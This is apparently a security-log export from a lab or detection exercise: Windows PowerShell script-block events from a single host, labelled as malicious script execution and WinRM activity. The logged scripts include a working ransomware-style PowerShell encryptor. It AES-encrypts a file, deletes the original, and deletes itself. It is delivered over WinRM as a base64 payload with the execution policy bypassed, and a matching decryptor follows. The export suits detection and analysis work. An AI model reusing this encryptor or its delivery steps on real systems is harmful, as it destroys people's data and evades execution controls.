"_time","Activity_Type","host.name","user.name","winlog.event_data.IpAddress","winlog.event_data.Image","winlog.event_data.TargetFilename","winlog.event_data.ScriptBlockText"
"2025-12-02T16:21:49.633+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:49.776+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:24:32.984+0000","2b. System Process (Noise/Telemetry)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\clipesu.exe
C:\Windows\System32\clipesu.exe","null
null","null
null"
"2025-12-02T16:24:33.011+0000",,"DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\ClipESUConsumer.exe
C:\Windows\System32\ClipESUConsumer.exe","null
null","null
null"
"2025-12-02T16:26:02.172+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:26:02.969+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
param (

    [string]$Path = ""C:\Program Files\data_important.txt"",

    [string]$KeyBase64 = ""xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8="", 

    [string]$IVBase64  = ""1a2b3c4d5e6f7g8h9i0j1k==""

)



try {

    if (-not (Test-Path $Path)) { throw ""Target missing"" }



    $Aes = [System.Security.Cryptography.Aes]::Create()

    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)

    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)



    $Bytes = [System.IO.File]::ReadAllBytes($Path)



    $Encryptor = $Aes.CreateEncryptor()

    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)



    $DestFile = $Path + "".aes""

    [System.IO.File]::WriteAllBytes($DestFile, $EncryptedBytes)



    Remove-Item -Path $Path -Force

    Write-Host ""[+] File Encrypted: $DestFile""

    

}

catch { Write-Error $_ }

finally {

    Remove-Item -Path $MyInvocation.MyCommand.Path -Force

}

param (

    [string]$Path = ""C:\Program Files\data_important.txt"",

    [string]$KeyBase64 = ""xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8="", 

    [string]$IVBase64  = ""1a2b3c4d5e6f7g8h9i0j1k==""

)



try {

    if (-not (Test-Path $Path)) { throw ""Target missing"" }



    $Aes = [System.Security.Cryptography.Aes]::Create()

    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)

    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)



    $Bytes = [System.IO.File]::ReadAllBytes($Path)



    $Encryptor = $Aes.CreateEncryptor()

    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)



    $DestFile = $Path + "".aes""

    [System.IO.File]::WriteAllBytes($DestFile, $EncryptedBytes)



    Remove-Item -Path $Path -Force

    Write-Host ""[+] File Encrypted: $DestFile""

    

}

catch { Write-Error $_ }

finally {

    Remove-Item -Path $MyInvocation.MyCommand.Path -Force

}"
"2025-12-02T16:26:43.317+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:06.437+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-02T16:27:06.573+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_l0ds2gj4.hv3.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_l0ds2gj4.hv3.ps1","null
null"
"2025-12-02T16:27:06.852+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:06.857+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-12-02T16:27:06.872+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-12-02T16:27:06.879+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-12-02T16:27:06.991+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:06.998+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt.ps1
C:\Program Files\encrypt.ps1","null
null"
"2025-12-02T16:27:07.064+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:07.106+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:28:20.317+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Rename-Item ""C:\Program Files\data_improtant.txt"" ""data_important.txt""

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
Rename-Item ""C:\Program Files\data_improtant.txt"" ""data_important.txt""

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:28:37.836+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
param (

    [string]$Path = ""C:\Program Files\data_important.txt"",

    [string]$KeyBase64 = ""xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8="", 

    [string]$IVBase64  = ""1a2b3c4d5e6f7g8h9i0j1k==""

)



try {

    if (-not (Test-Path $Path)) { throw ""Target missing"" }



    $Aes = [System.Security.Cryptography.Aes]::Create()

    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)

    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)



    $Bytes = [System.IO.File]::ReadAllBytes($Path)



    $Encryptor = $Aes.CreateEncryptor()

    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)



    $DestFile = $Path + "".aes""

    [System.IO.File]::WriteAllBytes($DestFile, $EncryptedBytes)



    Remove-Item -Path $Path -Force

    Write-Host ""[+] File Encrypted: $DestFile""

    

}

catch { Write-Error $_ }

finally {

    Remove-Item -Path $MyInvocation.MyCommand.Path -Force

}

param (

    [string]$Path = ""C:\Program Files\data_important.txt"",

    [string]$KeyBase64 = ""xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8="", 

    [string]$IVBase64  = ""1a2b3c4d5e6f7g8h9i0j1k==""

)



try {

    if (-not (Test-Path $Path)) { throw ""Target missing"" }



    $Aes = [System.Security.Cryptography.Aes]::Create()

    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)

    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)



    $Bytes = [System.IO.File]::ReadAllBytes($Path)



    $Encryptor = $Aes.CreateEncryptor()

    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)



    $DestFile = $Path + "".aes""

    [System.IO.File]::WriteAllBytes($DestFile, $EncryptedBytes)



    Remove-Item -Path $Path -Force

    Write-Host ""[+] File Encrypted: $DestFile""

    

}

catch { Write-Error $_ }

finally {

    Remove-Item -Path $MyInvocation.MyCommand.Path -Force

}"
"2025-12-02T16:28:46.658+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt.aes

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat data_important.txt.aes

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:29:32.999+0000",,"DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\ClipESUConsumer.exe
C:\Windows\System32\ClipESUConsumer.exe","null
null","null
null"
"2025-12-02T16:35:42.609+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","@'
param (
    [string]$Path = ""C:\Program Files\data_important.txt.aes"",
    [string]$KeyBase64 = ""xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8="",
    [string]$IVBase64  = ""1a2b3c4d5e6f7g8h9i0j1k==""
)

try {
    if (-not (Test-Path $Path)) { throw ""Encrypted file not found"" }

    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)
    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)

    $EncryptedBytes = [System.IO.File]::ReadAllBytes($Path)

    $Decryptor = $Aes.CreateDecryptor()
    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)

    $OriginalPath = $Path -replace ""\.aes$"", """"
    [System.IO.File]::WriteAllBytes($OriginalPath, $DecryptedBytes)

    Write-Host ""[+] File Decrypted: $OriginalPath""
}
catch { Write-Error $_ }
finally {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
}
'@ | Set-Content -Path ""C:\Program Files\decrypt.ps1""
@'
param (
    [string]$Path = ""C:\Program Files\data_important.txt.aes"",
    [string]$KeyBase64 = ""xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8="",
    [string]$IVBase64  = ""1a2b3c4d5e6f7g8h9i0j1k==""
)

try {
    if (-not (Test-Path $Path)) { throw ""Encrypted file not found"" }

    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)
    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)

    $EncryptedBytes = [System.IO.File]::ReadAllBytes($Path)

    $Decryptor = $Aes.CreateDecryptor()
    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)

    $OriginalPath = $Path -replace ""\.aes$"", """"
    [System.IO.File]::WriteAllBytes($OriginalPath, $DecryptedBytes)

    Write-Host ""[+] File Decrypted: $OriginalPath""
}
catch { Write-Error $_ }
finally {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
}
'@ | Set-Content -Path ""C:\Program Files\decrypt.ps1"""
"2025-12-02T16:37:53.331+0000","4a. Malicious Script Execution","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt
cat data_important.txt"
"2025-12-02T16:52:58.186+0000","2b. System Process (Noise/Telemetry)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\DeviceCensus.exe
C:\Windows\System32\DeviceCensus.exe","null
null","null
null"
"2025-12-03T07:11:09.048+0000","2b. System Process (Noise/Telemetry)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\clipesu.exe
C:\Windows\System32\clipesu.exe","null
null","null
null"
